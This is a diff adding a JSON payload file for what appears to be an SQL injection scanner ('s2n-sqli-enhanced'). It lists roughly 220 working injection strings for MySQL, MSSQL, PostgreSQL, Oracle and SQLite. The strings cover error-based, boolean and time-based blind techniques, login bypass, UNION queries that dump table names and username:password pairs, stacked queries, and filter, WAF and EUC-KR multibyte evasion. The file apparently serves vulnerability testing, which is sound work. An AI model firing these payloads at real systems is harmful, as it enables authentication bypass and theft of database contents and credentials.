@@ -1,0 +1,329 @@
+{
+  "metadata": {
+    "scanner": "s2n-sqli-enhanced",
+    "version": "1.0.0",
+    "description": "SQL Injection payloads for multiple DBMS (MySQL, MSSQL, PostgreSQL, Oracle, SQLite)",
+    "notes": "OWASP Testing Guide, SQLi Cheat Sheet 기반\n에러 기반: SQL 에러 메시지 유발\n불린 기반: 참/거짓 조건으로 데이터 추출\nUNION 기반: UNION SELECT로 데이터 추출\n시간 기반: 지연을 통한 블라인드 SQLi\n스택 쿼리: 다중 쿼리 실행\n필터 우회: 인코딩, 주석, 대소문자 변환\nWAF 우회: 인라인 주석, 대체 키워드, 인코딩",
+    "total_payloads": 220,
+    "author": "s2n Core Team",
+    "updated": "2025-01-10"
+  },
+  "payloads": {
+    "error_based": {
+      "generic": [
+        "'",
+        "\"",
+        "1'",
+        "1\"",
+        "1' --",
+        "1' #",
+        "1'/*",
+        "' OR ''='",
+        "\" OR \"\"=\"",
+        "') OR ('1'='1",
+        "\") OR (\"1\"=\"1"
+      ],
+      "mysql": [
+        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))-- ",
+        "1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1)-- ",
+        "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+        "1' AND EXP(~(SELECT * FROM (SELECT version())a))-- ",
+        "1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e, version(), 0x7e)) USING utf8)))-- ",
+        "1' AND GTID_SUBSET(CONCAT(0x7e, (SELECT version()), 0x7e), 0)-- ",
+        "1' AND ROW(1,1)>(SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)-- "
+      ],
+      "mssql": [
+        "1' AND 1=CONVERT(int, @@version)-- ",
+        "1' AND 1=CAST(@@version AS int)-- ",
+        "1'; DECLARE @v varchar(8000); SET @v=@@version; SELECT @v-- ",
+        "1' AND 1=db_name()-- ",
+        "1' HAVING 1=1-- ",
+        "1' GROUP BY columnname HAVING 1=1-- "
+      ],
+      "postgresql": [
+        "1' AND 1=CAST(version() AS int)-- ",
+        "1' AND 1=CAST(current_database() AS int)-- ",
+        "1'||(SELECT '')||'",
+        "1' AND TO_NUMBER(version(), '99999')-- "
+      ],
+      "oracle": [
+        "1' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- ",
+        "1' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE ROWNUM=1))-- ",
+        "1' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))-- "
+      ],
+      "sqlite": [
+        "1' AND 1=CAST(sqlite_version() AS int)-- ",
+        "1' AND RANDOMBLOB(1000000000)-- ",
+        "1' UNION SELECT sql FROM sqlite_master-- "
+      ]
+    },
+    "boolean_based": {
+      "tautology": [
+        "1' OR '1'='1' -- ",
+        "1' OR '1'='1'#",
+        "1' OR 1=1 -- ",
+        "1' OR 1=1#",
+        "1\" OR \"1\"=\"1\" -- ",
+        "1\" OR 1=1 -- ",
+        "1') OR ('1'='1' -- ",
+        "1') OR 1=1 -- ",
+        "1\") OR (\"1\"=\"1\" -- ",
+        "1 OR 1=1 -- ",
+        "1 OR 1=1#",
+        "-1 OR 1=1",
+        "-1' OR 1=1-- ",
+        "-1\" OR 1=1-- "
+      ],
+      "authentication_bypass": [
+        "' OR '1'='1'-- ",
+        "' OR '1'='1'#",
+        "' OR 1=1-- ",
+        "' OR 1=1#",
+        "admin'-- ",
+        "admin'#",
+        "admin' OR '1'='1",
+        "admin' OR '1'='1'-- ",
+        "admin' OR '1'='1'#",
+        "admin') OR ('1'='1'-- ",
+        "' OR 'x'='x",
+        "') OR ('x'='x",
+        "' OR 1=1 LIMIT 1-- ",
+        "' OR 1=1 LIMIT 1#",
+        "1' OR 1=1 LIMIT 1,1-- ",
+        "\" OR \"\"=\"",
+        "' OR ''='",
+        "'-'",
+        "' AND '1'='1",
+        "' AND 1=1 AND '1'='1"
+      ],
+      "conditional": [
+        "1' AND 1=1-- ",
+        "1' AND 1=2-- ",
+        "1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- ",
+        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- ",
+        "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64-- ",
+        "1' AND LENGTH(database())>0-- ",
+        "1' AND (SELECT 1 FROM dual WHERE 1=1)-- ",
+        "1' AND SUBSTRING(@@version,1,1)='5'-- "
+      ]
+    },
+    "union_based": {
+      "column_enumeration": [
+        "1' UNION SELECT NULL-- ",
+        "1' UNION SELECT NULL,NULL-- ",
+        "1' UNION SELECT NULL,NULL,NULL-- ",
+        "1' UNION SELECT NULL,NULL,NULL,NULL-- ",
+        "1' UNION SELECT NULL,NULL,NULL,NULL,NULL-- ",
+        "1' ORDER BY 1-- ",
+        "1' ORDER BY 2-- ",
+        "1' ORDER BY 3-- ",
+        "1' ORDER BY 5-- ",
+        "1' ORDER BY 10-- ",
+        "1' ORDER BY 100-- "
+      ],
+      "data_extraction": [
+        "1' UNION SELECT version(),NULL-- ",
+        "1' UNION SELECT @@version,NULL-- ",
+        "1' UNION SELECT database(),NULL-- ",
+        "1' UNION SELECT user(),NULL-- ",
+        "1' UNION SELECT current_user(),NULL-- ",
+        "1' UNION SELECT table_name,NULL FROM information_schema.tables-- ",
+        "1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- ",
+        "1' UNION SELECT CONCAT(username,':',password),NULL FROM users-- ",
+        "1' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- ",
+        "1' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'-- ",
+        "1' UNION ALL SELECT NULL,NULL-- ",
+        "1' UNION ALL SELECT 1,'a'-- ",
+        "-1' UNION SELECT 1,2-- ",
+        "-1' UNION SELECT 1,2,3-- "
+      ],
+      "mssql_specific": [
+        "1' UNION SELECT @@version,NULL-- ",
+        "1' UNION SELECT DB_NAME(),NULL-- ",
+        "1' UNION SELECT name,NULL FROM master..sysdatabases-- ",
+        "1' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'-- ",
+        "1' UNION SELECT name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')-- "
+      ],
+      "oracle_specific": [
+        "1' UNION SELECT banner,NULL FROM v$version-- ",
+        "1' UNION SELECT NULL,NULL FROM dual-- ",
+        "1' UNION SELECT table_name,NULL FROM all_tables-- ",
+        "1' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- "
+      ],
+      "sqlite_specific": [
+        "1' UNION SELECT sql,NULL FROM sqlite_master-- ",
+        "1' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- ",
+        "1' UNION SELECT sqlite_version(),NULL-- ",
+        "1' UNION SELECT tbl_name,NULL FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'-- "
+      ]
+    },
+    "stacked_queries": {
+      "generic": [
+        "1'; SELECT 1-- ",
+        "1\"; SELECT 1-- ",
+        "1'; SELECT version()-- ",
+        "1'; SELECT @@version-- "
+      ],
+      "mssql": [
+        "1'; WAITFOR DELAY '0:0:2'-- ",
+        "1'; EXEC sp_configure 'show advanced options',1-- "
+      ],
+      "postgresql": [
+        "1'; SELECT pg_sleep(2)-- ",
+        "1'; SELECT current_database()-- "
+      ]
+    }
+  },
+  "time_based": {
+    "mysql": [
+      "1' AND (SELECT SLEEP(2))-- ",
+      "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- ",
+      "1' AND SLEEP(2)-- ",
+      "1' AND SLEEP(2)#",
+      "1' AND (SELECT 5=5 FROM (SELECT(SLEEP(2)))a) AND '1'='1",
+      "1' OR SLEEP(2)-- ",
+      "1' OR SLEEP(2)#",
+      "1\" AND SLEEP(2)-- ",
+      "1\" AND SLEEP(2)#",
+      "1') AND SLEEP(2)-- ",
+      "1') AND SLEEP(2)#",
+      "1 AND SLEEP(2)",
+      "1' AND BENCHMARK(5000000, MD5('test'))-- ",
+      "1' AND IF(1=1, SLEEP(2), 0)-- ",
+      "1' AND IF(1=1, SLEEP(2), 0)#",
+      "1' AND (SELECT IF(1=1, SLEEP(2), 0))-- ",
+      "1'; SELECT SLEEP(2)-- "
+    ],
+    "mssql": [
+      "1'; WAITFOR DELAY '0:0:2'-- ",
+      "1' WAITFOR DELAY '0:0:2'-- ",
+      "1'; IF (1=1) WAITFOR DELAY '0:0:2'-- ",
+      "1' IF (1=1) WAITFOR DELAY '0:0:2'-- ",
+      "1\"; WAITFOR DELAY '0:0:2'-- ",
+      "1'); WAITFOR DELAY '0:0:2'-- "
+    ],
+    "postgresql": [
+      "1' AND (SELECT pg_sleep(2))-- ",
+      "1'; SELECT pg_sleep(2)-- ",
+      "1' AND 1=(SELECT 1 FROM pg_sleep(2))-- ",
+      "1\" AND (SELECT pg_sleep(2))-- ",
+      "1') AND (SELECT pg_sleep(2))-- ",
+      "1' || (SELECT pg_sleep(2))-- ",
+      "1'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END-- "
+    ],
+    "oracle": [
+      "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',2)-- ",
+      "1' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',2) ELSE 1 END FROM dual)-- "
+    ],
+    "sqlite": [
+      "1' AND 1=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(100000000/2))))-- ",
+      "1' AND RANDOMBLOB(100000000)-- "
+    ]
+  },
+  "filter_bypass": {
+    "encoding": [
+      "1%27%20OR%20%271%27%3D%271",
+      "1%27%20AND%201%3D1%20--%20",
+      "1%27%20UNION%20SELECT%20NULL%2CNULL--%20",
+      "%31%27%20%4F%52%20%27%31%27%3D%27%31",
+      "1' %55%4E%49%4F%4E %53%45%4C%45%43%54 NULL--"
+    ],
+    "double_encoding": [
+      "1%2527%2520OR%25201%253D1",
+      "%252527%252520OR%2525201%25253D1"
+    ],
+    "comment_bypass": [
+      "1'/**/OR/**/1=1-- ",
+      "1'/**/UNION/**/SELECT/**/NULL-- ",
+      "1'/**/AND/**/1=1-- ",
+      "1'/*!OR*/1=1-- ",
+      "1'/*!50000OR*/1=1-- ",
+      "1'/*!UNION*//*!SELECT*/NULL-- ",
+      "1'+/*!OR*/+'1'='1",
+      "1'--/**/%0aOR 1=1-- "
+    ],
+    "case_variation": [
+      "1' oR '1'='1'-- ",
+      "1' Or 1=1-- ",
+      "1' uNiOn SeLeCt NULL-- ",
+      "1' UnIoN sElEcT NULL,NULL-- ",
+      "1' AnD 1=1-- ",
+      "1' sElEcT @@vErSiOn-- "
+    ],
+    "space_bypass": [
+      "1'%09OR%091=1-- ",
+      "1'%0aOR%0a1=1-- ",
+      "1'%0dOR%0d1=1-- ",
+      "1'%0bOR%0b1=1-- ",
+      "1'+OR+1=1-- ",
+      "1'(OR)1=1-- "
+    ],
+    "null_byte": [
+      "1'%00OR 1=1-- ",
+      "1'%00UNION SELECT NULL-- ",
+      "%001'OR'1'='1"
+    ],
+    "parenthesis_bypass": [
+      "1')OR('1'='1",
+      "1'))OR(('1'='1",
+      "1')))OR((('1'='1"
+    ]
+  },
+  "waf_bypass": {
+    "inline_comments": [
+      "1'/*!50000UNION*//*!50000SELECT*/NULL-- ",
+      "1'/*!50000AND*/1=1-- ",
+      "1'/*!UNION*//*!SELECT*/1,2-- ",
+      "/*!32302 1'AND(SELECT*FROM(SELECT SLEEP(2))a)='*/",
+      "1' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ NULL-- "
+    ],
+    "alternative_keywords": [
+      "1' UNION ALL SELECT NULL-- ",
+      "1' UNION DISTINCT SELECT NULL-- ",
+      "1' && 1=1-- ",
+      "1' || 1=1-- ",
+      "1' XOR 1=1-- ",
+      "1' DIV 1-- ",
+      "1' LIKE 1-- ",
+      "1' RLIKE 1-- ",
+      "1' REGEXP 1-- ",
+      "1' BETWEEN 0 AND 2-- ",
+      "1' NOT BETWEEN 3 AND 5-- "
+    ],
+    "concat_functions": [
+      "1' AND CONCAT('','')=''-- ",
+      "1' UNION SELECT CONCAT_WS(',',1,2)-- ",
+      "1' AND GROUP_CONCAT(1)-- ",
+      "CONCAT(0x27,0x4F52,0x27,0x31,0x27,0x3D,0x27,0x31)"
+    ],
+    "hex_encoding": [
+      "1' AND 0x313D31-- ",
+      "1' UNION SELECT 0x74657374-- ",
+      "1' AND CHAR(49)=CHAR(49)-- "
+    ],
+    "no_comma": [
+      "1' UNION SELECT * FROM (SELECT NULL)a JOIN (SELECT NULL)b-- ",
+      "1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b-- ",
+      "1' AND SUBSTR(database() FROM 1 FOR 1)='a'-- ",
+      "1' AND IF(MID(database() FROM 1 FOR 1)='a', SLEEP(2), 0)-- "
+    ],
+    "no_space": [
+      "1'AND(1=1)-- ",
+      "1'OR(1=1)-- ",
+      "1'UNION(SELECT(NULL))-- ",
+      "(1)OR(1=1)-- ",
+      "'AND'1'='1"
+    ]
+  },
+  "korean_encoding_specific": {
+    "euc_kr_bypass": [
+      "%BF%27 OR 1=1-- ",
+      "%A1%27 OR 1=1-- ",
+      "%C0%27 OR 1=1-- "
+    ],
+    "multibyte_bypass": [
+      "%bf%5c' OR 1=1-- ",
+      "%ef%bb%bf' OR 1=1-- "
+    ]
+  }
+}
